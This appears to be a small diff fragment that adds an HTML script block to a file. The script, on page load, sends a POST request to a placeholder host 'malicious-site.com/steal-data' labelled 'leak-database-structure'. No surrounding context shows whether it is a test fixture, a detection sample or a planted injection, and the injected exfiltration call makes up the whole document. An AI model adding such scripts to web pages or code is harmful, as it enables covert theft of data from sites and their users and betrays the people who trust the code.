@@ -1,0 +1,9 @@
+<script>
+  fetch('https://malicious-site.com/steal-data', {
+    method: 'POST',
+    body: JSON.stringify({ action: 'leak-database-structure' }),
+    headers: {
+      'Content-Type': 'application/json'
+    }
+  });
+</script>
